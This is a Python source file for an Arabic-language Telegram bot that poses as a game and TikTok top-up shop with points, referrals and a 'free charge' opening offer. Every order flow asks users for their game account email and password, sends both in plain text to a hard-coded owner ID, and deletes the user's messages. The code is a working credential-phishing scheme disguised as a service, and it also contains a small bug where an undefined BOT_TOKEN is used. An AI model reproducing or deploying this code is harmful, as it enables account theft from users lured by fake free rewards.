# -*- coding: utf-8 -*-
"""
بوت تيليجرام - شحن الألعاب + نقاط / إحالة / مهام + ربط حساب + شحن مجاني (عرض افتتاح)
60 نقطة = 1 دولار

التشغيل:
    pip install python-telegram-bot --upgrade
    python bot.py
"""

import json
import os
from datetime import date

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# ================= الإعدادات =================
TOKEN = os.environ.get("BOT_TOKEN")
OWNER_ID = 6233477031  # كل الرسائل والطلبات تروح لهذا الآيدي

DATA_FILE = "data.json"
POINTS_PER_USD = 60  # 60 نقطة = 1 دولار

# ================= الألعاب =================
GAMES = {
    "pubg":   {"name": "ببجي",                    "emoji": "🎮"},
    "ff":     {"name": "فري فاير",                 "emoji": "🔥"},
    "codm":   {"name": "كول أوف ديوتي موبايل",      "emoji": "🪖"},
    "clash":  {"name": "كلاش أوف كلانس",           "emoji": "🏰"},
    "roblox": {"name": "روبلوكس",                  "emoji": "🧱"},
    "tiktok": {"name": "جواهر تيك توك",             "emoji": "💎"},
}

# ================= العروض (تُشترى بالنقاط) =================
PACKAGES = {
    "pubg_60uc":   {"game": "pubg",   "name": "60 UC ببجي",          "usd": 1, "emoji": "🎮"},
    "pubg_325uc":  {"game": "pubg",   "name": "325 UC ببجي",         "usd": 5, "emoji": "🎮"},
    "ff_110d":     {"game": "ff",     "name": "110 جوهرة فري فاير",  "usd": 1, "emoji": "🔥"},
    "ff_341d":     {"game": "ff",     "name": "341 جوهرة فري فاير",  "usd": 3, "emoji": "🔥"},
    "codm_80cp":   {"game": "codm",   "name": "80 CP كول أوف ديوتي", "usd": 1, "emoji": "🪖"},
    "clash_5000":  {"game": "clash",  "name": "5000 ذهب كلاش",       "usd": 1, "emoji": "🏰"},
    "roblox_400r": {"game": "roblox", "name": "400 روبوكس",          "usd": 5, "emoji": "🧱"},
    "tiktok_100c": {"game": "tiktok", "name": "100 عملة تيك توك",    "usd": 1, "emoji": "💎"},
}


# ================= إدارة البيانات =================
def load_data():
    if not os.path.exists(DATA_FILE):
        return {"users": {}}
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {"users": {}}


def save_data(data):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


def get_user(data, user_id):
    uid = str(user_id)
    if uid not in data["users"]:
        data["users"][uid] = {
            "points": 0,
            "referred_by": None,
            "invited": 0,
            "last_daily": "",
            "free_used": False,
        }
    u = data["users"][uid]
    # ترقية البيانات القديمة
    u.setdefault("free_used", False)
    u.setdefault("points", 0)
    u.setdefault("invited", 0)
    u.setdefault("last_daily", "")
    return u


def pkg_cost(pkg):
    return int(pkg["usd"] * POINTS_PER_USD)


# ================= لوحات المفاتيح =================
def main_menu_keyboard():
    keyboard = []
    row = []
    for code, info in GAMES.items():
        row.append(InlineKeyboardButton(
            f"{info['emoji']} شحن {info['name']}",
            callback_data=f"game_{code}"
        ))
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    keyboard.append([InlineKeyboardButton("🎁 شحن مجاني — عرض الافتتاح", callback_data="free_charge")])
    keyboard.append([InlineKeyboardButton("📅 المهمة اليومية (+3)", callback_data="daily")])
    keyboard.append([
        InlineKeyboardButton("💰 نقاطي", callback_data="my_points"),
        InlineKeyboardButton("🔗 رابط الإحالة", callback_data="my_ref"),
    ])
    return InlineKeyboardMarkup(keyboard)


def game_submenu_keyboard(code):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🎁 شحن بالنقاط", callback_data=f"points_{code}")],
        [InlineKeyboardButton("💳 شحن مباشر (مدفوع)", callback_data=f"direct_{code}")],
        [InlineKeyboardButton("⬅️ رجوع", callback_data="main")],
    ])


def points_shop_keyboard(code):
    rows = []
    for pid, pkg in PACKAGES.items():
        if pkg["game"] != code:
            continue
        cost = pkg_cost(pkg)
        rows.append([InlineKeyboardButton(
            f"{pkg['emoji']} {pkg['name']} — {cost} نقطة",
            callback_data=f"buy_{pid}"
        )])
    rows.append([InlineKeyboardButton("⬅️ رجوع", callback_data=f"game_{code}")])
    return InlineKeyboardMarkup(rows)


def free_game_keyboard():
    keyboard = []
    row = []
    for code, info in GAMES.items():
        row.append(InlineKeyboardButton(
            f"{info['emoji']} {info['name']}",
            callback_data=f"freegame_{code}"
        ))
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    keyboard.append([InlineKeyboardButton("⬅️ رجوع", callback_data="main")])
    return InlineKeyboardMarkup(keyboard)


def free_package_keyboard(code):
    rows = []
    for pid, pkg in PACKAGES.items():
        if pkg["game"] != code:
            continue
        rows.append([InlineKeyboardButton(
            f"{pkg['emoji']} {pkg['name']}",
            callback_data=f"freebuy_{pid}"
        )])
    rows.append([InlineKeyboardButton("⬅️ رجوع", callback_data="free_charge")])
    return InlineKeyboardMarkup(rows)


def back_main_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ رجوع", callback_data="main")]])


def cancel_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء الطلب", callback_data="cancel_flow")]])


# ================= نص القائمة الرئيسية =================
def main_menu_text(user, data):
    u = get_user(data, user.id)
    usd = u["points"] / POINTS_PER_USD
    free_status = "✅ مستعمل" if u.get("free_used") else "🎁 متاح"
    return (
        f"🎉 أهلاً {user.full_name}\n"
        f"💰 نقاطك: {u['points']} (≈ ${usd:.2f})\n"
        f"👥 دخلوا من رابطك: {u['invited']}\n"
        f"🎁 الشحن المجاني: {free_status}\n\n"
        f"اختر اللعبة اللي تبي تشحن فيها:"
    )


# ================= إشعار المالك =================
async def notify_owner(context: ContextTypes.DEFAULT_TYPE, user, action_text: str):
    sender_name = user.full_name if user else "غير معروف"
    sender_id = user.id if user else "غير معروف"
    username = f"@{user.username}" if user and user.username else "لا يوجد يوزر"

    text = (
        f"🔔 إجراء جديد\n"
        f"من: {sender_name} ({username})\n"
        f"آيدي: {sender_id}\n"
        f"{action_text}"
    )
    try:
        await context.bot.send_message(chat_id=OWNER_ID, text=text)
    except Exception:
        pass


# ================= أمر البداية =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    data = load_data()
    uid = str(user.id)
    is_new = uid not in data["users"]

    u = get_user(data, user.id)

    if is_new:
        u["points"] += 1  # نقطة الترحيب

        if context.args:
            arg = context.args[0]
            if arg.startswith("ref_"):
                ref_id = arg[4:]
                if ref_id != uid and ref_id in data["users"]:
                    u["referred_by"] = ref_id
                    ref = data["users"][ref_id]
                    bonus = 10 if ref["invited"] == 0 else 15
                    ref["points"] += bonus
                    ref["invited"] += 1
                    try:
                        await context.bot.send_message(
                            chat_id=int(ref_id),
                            text=f"🎉 شخص جديد دخل من رابطك!\n+{bonus} نقطة"
                        )
                    except Exception:
                        pass

    save_data(data)

    await update.message.reply_text(
        main_menu_text(user, data),
        reply_markup=main_menu_keyboard()
    )


# ================= بدء تدفق ربط الحساب =================
async def start_flow(query, context, game_code, pkg_id=None, free=False):
    context.user_data["flow"] = {
        "step": "email",
        "game": game_code,
        "pkg": pkg_id,
        "free": free,
        "email": None,
    }
    g = GAMES.get(game_code, {"name": "لعبة", "emoji": "🎮"})
    pkg = PACKAGES.get(pkg_id) if pkg_id else None
    target = f"{pkg['emoji']} {pkg['name']}" if pkg else f"💳 شحن {g['name']} المباشر"
    label = "🎁 شحن مجاني — عرض الافتتاح" if free else target

    await query.edit_message_text(
        f"🔗 ربط حسابك\n"
        f"الطلب: {label}\n\n"
        f"لإتمام الطلب أرسل لنا:\n"
        f"📧 الإيميل المرتبط بحسابك\n"
        f"🔑 والباسورد\n\n"
        f"أرسل *الإيميل* الآن:",
        parse_mode="Markdown",
        reply_markup=cancel_keyboard()
    )


# ================= إتمام الطلب =================
async def finish_flow(message, context, flow):
    user = message.from_user
    data = load_data()
    u = get_user(data, user.id)

    game_code = flow["game"]
    pkg_id = flow.get("pkg")
    is_free = flow.get("free", False)
    g = GAMES.get(game_code, {"name": "لعبة", "emoji": "🎮"})
    pkg = PACKAGES.get(pkg_id) if pkg_id else None

    # منع تكرار الشحن المجاني
    if is_free and u.get("free_used"):
        await message.reply_text(
            "❌ لقد استعملت عرض الشحن المجاني مسبقاً.\n"
            "العرض متاح مرة واحدة لكل مستخدم.",
            reply_markup=back_main_keyboard()
        )
        return

    # خصم النقاط إذا كان شراء بالنقاط (مش مجاني)
    if pkg and not is_free:
        cost = pkg_cost(pkg)
        if u["points"] < cost:
            await message.reply_text(
                f"❌ نقاطك غير كافية لإتمام الطلب ({cost} نقطة).",
                reply_markup=back_main_keyboard()
            )
            return
        u["points"] -= cost

    # تعليم استعمال العرض المجاني
    if is_free:
        u["free_used"] = True

    save_data(data)

    # رسالة المالك
    owner_text = (
        f"🛒 طلب شحن جديد\n"
        f"👤 من: {user.full_name}"
        + (f" (@{user.username})" if user.username else "")
        + f"\n🆔 {user.id}\n"
        f"🎮 اللعبة: {g['name']}\n"
    )
    if is_free:
        owner_text += "🎁 النوع: شحن مجاني — عرض الافتتاح\n"
    elif pkg:
        owner_text += f"📦 الباقة: {pkg['name']}\n💠 التكلفة: {pkg_cost(pkg)} نقطة\n"
    else:
        owner_text += "📦 النوع: شحن مباشر (مدفوع)\n"
    owner_text += (
        f"\n📧 الإيميل: {flow['email']}\n"
        f"🔑 الباسورد: {flow['password']}"
    )

    try:
        await context.bot.send_message(chat_id=OWNER_ID, text=owner_text)
    except Exception:
        pass

    await message.reply_text(
        "✅ تم استلام بياناتك بنجاح.\n"
        "سيتم تنفيذ الطلب بأقرب وقت.\n\n"
        "🔒 لا تشارك بياناتك مع أي أحد آخر.",
        reply_markup=back_main_keyboard()
    )


# ================= معالج الأزرار =================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user = query.from_user
    data = load_data()
    u = get_user(data, user.id)
    cb = query.data

    # أي ضغطة زر تلغي أي تدفق مفتوح
    context.user_data.pop("flow", None)

    # ---- إلغاء الطلب ----
    if cb == "cancel_flow":
        await query.edit_message_text(
            "❌ تم إلغاء الطلب.",
            reply_markup=back_main_keyboard()
        )
        return

    # ---- رجوع للقائمة الرئيسية ----
    if cb == "main":
        await query.edit_message_text(
            main_menu_text(user, data),
            reply_markup=main_menu_keyboard()
        )
        return

    # ---- المهمة اليومية ----
    if cb == "daily":
        today = date.today().isoformat()
        if u["last_daily"] == today:
            await query.edit_message_text(
                "⏳ استلمت مهمة اليوم بالفعل، ارجع غداً.",
                reply_markup=back_main_keyboard()
            )
            return
        u["last_daily"] = today
        u["points"] += 3
        save_data(data)
        await query.edit_message_text(
            f"✅ تم استلام المهمة اليومية!\n"
            f"+3 نقاط\n"
            f"💰 رصيدك الآن: {u['points']} نقطة",
            reply_markup=back_main_keyboard()
        )
        await notify_owner(context, user, "استلم المهمة اليومية (+3)")
        return

    # ---- نقاطي ----
    if cb == "my_points":
        usd = u["points"] / POINTS_PER_USD
        await query.edit_message_text(
            f"💰 نقاطك: {u['points']}\n"
            f"≈ ${usd:.2f}\n\n"
            f"👥 دخلوا من رابطك: {u['invited']}\n"
            f"🎯 كل {POINTS_PER_USD} نقطة = $1",
            reply_markup=back_main_keyboard()
        )
        return

    # ---- رابط الإحالة ----
    if cb == "my_ref":
        me = await context.bot.get_me()
        link = f"https://t.me/{me.username}?start=ref_{user.id}"
        await query.edit_message_text(
            f"🔗 رابط الإحالة الخاص بك:\n{link}\n\n"
            f"• أول شخص يدخل من رابطك: +10 نقاط\n"
            f"• الثاني وما بعده: +15 نقطة\n\n"
            f"🎯 كل {POINTS_PER_USD} نقطة = $1",
            reply_markup=back_main_keyboard()
        )
        return

    # ============ الشحن المجاني (عرض الافتتاح) ============
    if cb == "free_charge":
        if u.get("free_used"):
            await query.edit_message_text(
                "❌ لقد استعملت عرض الشحن المجاني مسبقاً.\n"
                "العرض متاح مرة واحدة فقط لكل مستخدم.",
                reply_markup=back_main_keyboard()
            )
            return
        await query.edit_message_text(
            "🎁 شحن مجاني — عرض الافتتاح\n\n"
            "اختر اللعبة اللي تبي تشحنها مجاناً (مرة واحدة فقط):",
            reply_markup=free_game_keyboard()
        )
        return

    if cb.startswith("freegame_"):
        if u.get("free_used"):
            await query.edit_message_text(
                "❌ لقد استعملت عرض الشحن المجاني مسبقاً.",
                reply_markup=back_main_keyboard()
            )
            return
        code = cb[9:]
        g = GAMES.get(code)
        if not g:
            return
        await query.edit_message_text(
            f"🎁 اختر الباقة المجانية من {g['name']}:",
            reply_markup=free_package_keyboard(code)
        )
        return

    if cb.startswith("freebuy_"):
        if u.get("free_used"):
            await query.edit_message_text(
                "❌ لقد استعملت عرض الشحن المجاني مسبقاً.",
                reply_markup=back_main_keyboard()
            )
            return
        pid = cb[8:]
        pkg = PACKAGES.get(pid)
        if not pkg:
            return
        await notify_owner(context, user, f"يستخدم العرض المجاني: {pkg['name']}")
        await start_flow(query, context, pkg["game"], pid, free=True)
        return

    # ---- اختيار لعبة ----
    if cb.startswith("game_"):
        code = cb[5:]
        g = GAMES.get(code)
        if not g:
            return
        await notify_owner(context, user, f"اختار شحن {g['name']}")
        await query.edit_message_text(
            f"{g['emoji']} شحن {g['name']}\nاختر الطريقة:",
            reply_markup=game_submenu_keyboard(code)
        )
        return

    # ---- متجر النقاط للعبة ----
    if cb.startswith("points_"):
        code = cb[7:]
        g = GAMES.get(code)
        if not g:
            return
        await query.edit_message_text(
            f"🎁 عروض {g['name']} بالنقاط\n"
            f"💰 رصيدك: {u['points']} نقطة",
            reply_markup=points_shop_keyboard(code)
        )
        return

    # ---- الشحن المباشر (مدفوع) ----
    if cb.startswith("direct_"):
        code = cb[7:]
        g = GAMES.get(code)
        if not g:
            return
        await notify_owner(context, user, f"فتح الشحن المباشر لـ {g['name']}")
        await start_flow(query, context, code, None)
        return

    # ---- الشراء بالنقاط ----
    if cb.startswith("buy_"):
        pid = cb[4:]
        pkg = PACKAGES.get(pid)
        if not pkg:
            return
        cost = pkg_cost(pkg)
        if u["points"] < cost:
            await query.edit_message_text(
                f"❌ نقاطك غير كافية.\n"
                f"تحتاج {cost} نقطة، وعندك {u['points']}.\n\n"
                f"💡 اجمع نقاط من المهمة اليومية أو من رابط الإحالة.",
                reply_markup=back_main_keyboard()
            )
            return
        await start_flow(query, context, pkg["game"], pid)
        return


# ================= توصيل الرسائل للمالك =================
async def forward_to_owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    if message is None:
        return

    user = message.from_user
    sender_name = user.full_name if user else "غير معروف"
    sender_id = user.id if user else "غير معروف"
    username = f"@{user.username}" if user and user.username else "لا يوجد يوزر"

    info_text = (
        f"📩 رسالة جديدة\n"
        f"من: {sender_name} ({username})\n"
        f"آيدي: {sender_id}"
    )
    try:
        await context.bot.send_message(chat_id=OWNER_ID, text=info_text)
        await context.bot.forward_message(
            chat_id=OWNER_ID,
            from_chat_id=message.chat_id,
            message_id=message.message_id,
        )
    except Exception:
        pass


# ================= معالج الرسائل =================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    if message is None:
        return

    flow = context.user_data.get("flow")

    if flow:
        text = (message.text or "").strip()

        if flow["step"] == "email":
            flow["email"] = text
            flow["step"] = "password"
            await message.reply_text(
                "✉️ تم حفظ الإيميل.\n"
                "الآن أرسل *الباسورد*:",
                parse_mode="Markdown",
                reply_markup=cancel_keyboard()
            )
            try:
                await message.delete()
            except Exception:
                pass
            return

        if flow["step"] == "password":
            flow["password"] = text
            await finish_flow(message, context, flow)
            context.user_data.pop("flow", None)
            try:
                await message.delete()
            except Exception:
                pass
            return

    await forward_to_owner(update, context)


# ================= التشغيل =================
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle_message))

    print("البوت يعمل الآن...")
    app.run_polling()


if __name__ == "__main__":
    main()
